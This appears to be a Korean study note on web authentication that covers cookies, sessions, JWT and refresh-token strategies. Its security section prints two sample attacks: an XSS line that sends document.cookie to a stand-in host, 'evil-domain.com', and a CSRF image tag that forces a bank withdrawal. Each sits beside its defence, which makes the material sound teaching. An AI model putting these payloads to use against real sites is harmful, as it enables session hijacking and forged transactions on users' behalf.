## HTTP 특성

HTTP 프로토콜은 비연결성(connectionless) 및 무상태성(stateless)이라는 특징을 갖는다. HTTP 요청에 대한 응답을 처리하면 연결을 끊어버리기 때문에 클라이언트에 대한 이전 상태 정보가 남아있지 않게 된다.

이는 불필요한 자원 낭비를 줄일 수 있지만 클라이언트를 식별할 수 없다는 단점이 존재한다. (예를 들면 로그인을 하더라도 다음 요청에서 다시 로그인해야 함)

쿠키와 세션은 HTTP 특징을 보완하여 클라이언트 상태를 유지하기 위한 방법이다.

## 쿠키🍪

> 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각

- 서버에서 `Set-Cookie` 응답 헤더에 쿠키 정보를 담아 전송한다. `Set-Cookie: <cookie-name>=<cookie-value>`
- 브라우저는 응답받은 쿠키를 하드디스크에 저장해두고 동일한 서버에 요청할 때마다 `Cookie` 요청 헤더에 담아 전송한다.
- 주로 사용되는 상황
  - 세션 관리
  - 사용자 설정
  - 트래킹
- 💡 모든 요청마다 쿠키가 전송되기 때문에 성능이 떨어지는 원인이 될 수 있다. 웹 스토리지나 IndexedDB를 사용하는 것을 권장한다.

### 쿠키의 라이프 타임

- 만료일 혹은 지속시간도 명시될 수 있고, 만료된 쿠키는 더이상 보내지 않는다.
- 세션 쿠키는 브라우저의 세션이 종료될 때 삭제된다.
- 영속 쿠키는 `Expires` 속성에 명시된 날짜에 삭제되거나, `Max-Age` 속성에 명시된 기간 이후 삭제된다.
- ex) Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

### 쿠키의 스코프

Domain
- 쿠키가 전송되게 될 호스트들을 명시한다.
- 명시되지 않는다면 현재 문서 위치의 호스트 일부를 기본값으로 한다.
- 명시되면 서브도메인들을 포함한다. 만약 Domain=mozilla.org이 설정되면 쿠키들은 developer.mozilla.org와 같은 서브도메인에 포함된다.

Path
- Cookie 헤더를 전송하기 위하여 요청되는 URL 내에 반드시 존재해야 하는 URL 경로
- 만약 Path=/docs이 설정되면 다음의 경로들은 모두 매치된다.
   - /docs, /docs/Web/, /docs/Web/HTTP

### `Secure`과 `HttpOnly` 쿠키

- Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된 요청일 경우에만 전송된다.
- XSS 공격을 방지하기 위해 `HttpOnly` 쿠키는 자바스크립트로 (document.cookie) 접근할 수 없다. 서버에 전송되기만 한다.

## 쿠키의 보안 문제

### XSS와 세션 하이재킹

- XSS 취약점을 이용하여 쿠키를 가로챌 수 있다.
  - 인증 정보 유출 및 조작 위험
  - 클라이언트로 위장
- ✅ HttpOnly 속성을 통해 자바스크립트를 통해 쿠키 값에 접근하는 것을 막을 수 있다.

```jsx
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

### 사이트간 요청 위조 (CSRF)

- 특정 웹 사이트에 공격자가 의도한 행위를 요청하게 할 수 있다.
- ✅ 민감한 동작에 사용되는 쿠키는 만료 시간을 짧게 설정한다.

```jsx
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

## 세션 기반 인증

> 클라이언트의 인증 정보를 서버에 저장하는 방식

1. 클라이언트가 인증 정보를 입력한 후 서버에 전송
2. 서버에서 세션 생성 후 세션 아이디를 `Set-Cookie` 응답 헤더에 담아 전송
3. 브라우저는 매 요청마다 세션 아이디를 `Cookie` 요청 헤더에 담아 전송
4. 서버는 세션 아이디가 유효한지 검증하고 클라이언트를 식별

### 장단점

- 쿠키를 포함한 요청이 탈취되더라도 상대적으로 안전하다.
  - 인증 정보를 서버 측에 저장하고 쿠키에는 세션 아이디만 담기 때문
  - 서버에서 세션 무효화도 가능
- 서버의 자원을 사용한다. 메모리 차지, 동시 접속자가 많은 경우 부하 증가
- 서버 확장(scale out)시 문제가 발생한다.

## JWT (JSON Web Token)

- 인증에 필요한 정보들을 암호화시킨 토큰
- .을 구분자로 하여 세가지 문자열의 조합으로 구성된다.

| Encoded | Decoded |
| --- | --- |
| ![image](https://user-images.githubusercontent.com/62097867/222881519-e387651c-056b-43ff-a952-9a763eb53b66.png) | ![image](https://user-images.githubusercontent.com/62097867/222881533-73b969c4-ba84-446a-9d8f-d17cb13a1111.png) |

**Header**

- alg : 서명 암호화를 위한 해싱 알고리즘
- typ : 토큰 타입

**Payload**

- 토큰에 담을 정보
- 주로 클라이언트의 고유 ID 값 및 유효 기간 등

**Signature**

- 인코딩된 header와 payload를 해싱하고 개인키로 암호화하여 생성한 전자서명
- 서버에서 토큰의 위조/변조 여부를 확인하는 데 사용된다.
  - header와 payload는 인코딩된 값이기 때문에 디코딩 및 조작이 가능하지만 signature는 서버 측에서 관리하는 개인키가 유출되지 않는 이상 복호화할 수 없다.

https://jwt.io/

## 토큰 기반 인증

> JWT 토큰(Access Token)을 HTTP 헤더에 실어 서버가 클라이언트를 식별하는 방식

1. 클라이언트가 서버에 인증을 요청한다.
2. 서버는 이를 검증한 후 클라이언트 고유 ID 등의 정보를 payload에 담는다.
3. 개인키를 사용해 access token을 발급한 후 이를 쿠키에 담아 응답한다.
4. 클라이언트는 토큰을 저장해두고 서버에 요청할 때마다 요청 헤더 `Authorization` 에 담아 전달한다. `{ Authorization: <type> <access-token> }`
5. 서버는 토큰의 signature를 개인키로 복호화한 다음 위변조 여부 및 유효 기간을 확인한다.
6. 유효한 토큰이라면 요청에 응답한다.

### 장점

- signature를 통해 header와 payload 데이터 위변조를 막을 수 있다.
- 인증을 위한 별도의 저장소가 필요없다. 필요한 정보를 토큰 자체에 지니고 있기 때문
- 클라이언트 인증 정보를 저장하는 세션과 다르게 서버는 무상태가 된다.

### 단점

- payload 자체는 암호화되지 않기 때문에 중요한 데이터를 담을 수 없다.
- 토큰을 탈취당하면 대처하기 어렵다.
  - 쿠키/세션 기반 인증은 서버쪽에서 쉽게 세션을 삭제할 수 있다.

### 보안 전략

**1. 짧은 만료 기한 설정**

- 토큰이 탈취되더라도 빠르게 만료되기 때문에 피해를 최소화할 수 있다.
- 단점
  - 사용자가 자주 로그인해야 하는 불편함이 발생한다.

**2. Sliding Session**

- 서비스를 지속적으로 이용하는 클라이언트에게 자동으로 토큰 만료 기한을 늘려주는 전략
- 단점
  - 글 작성 혹은 결제 등을 진행하는 도중 토큰이 만료가 된다면 작업이 정상적으로 처리되지 않고 작성 정보가 날아가는 등 불편함이 발생할 수 있다.

**3. Refresh Token**

- 클라이언트가 로그인 요청을 보내면 access token과 더불어 그보다 긴 만료 기한을 가진 refresh token을 발급하는 전략
- 동작 방식
  - access token이 만료되었을 때 refresh token을 사용하여 access token의 재발급을 요청한다.
  - 서버는 DB에 저장된 refresh token과 비교하여 유효한 경우 새로운 access token을 발급하고 만료된 경우 사용자에게 로그인을 요구한다.
- 장단점
  - access token의 만료 기한을 짧게 설정할 수 있다.
  - 사용자가 자주 로그인할 필요가 없다.
  - 서버가 강제로 refresh token을 만료시킬 수 있다.
  - refresh token을 별도의 스토리지에 저장하여 검증을 수행해야 하므로 추가적인 I/O 작업이 발생한다. 이는 JWT의 장점(I/O 오버헤드없이 빠른 인증 처리)을 완벽하게 누릴 수 없다.

https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies

https://www.daleseo.com/http-session/

https://tecoble.techcourse.co.kr/post/2021-05-22-cookie-session-jwt/